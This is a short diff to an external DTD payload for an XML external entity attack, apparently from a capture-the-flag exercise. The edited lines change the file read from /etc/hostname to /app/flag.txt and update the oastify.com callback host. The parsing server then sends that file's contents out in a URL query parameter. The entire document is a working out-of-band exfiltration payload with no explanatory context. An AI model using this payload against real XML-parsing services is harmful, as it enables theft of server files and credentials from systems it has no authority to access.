@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://dub2t8y32mkk9v3ba5lq27zbu20zosch.oastify.com/?x=%file;'>">
+<!ENTITY % file SYSTEM "file:///app/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://i2l71d68arsph0bgiatvac7g2784wzko.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
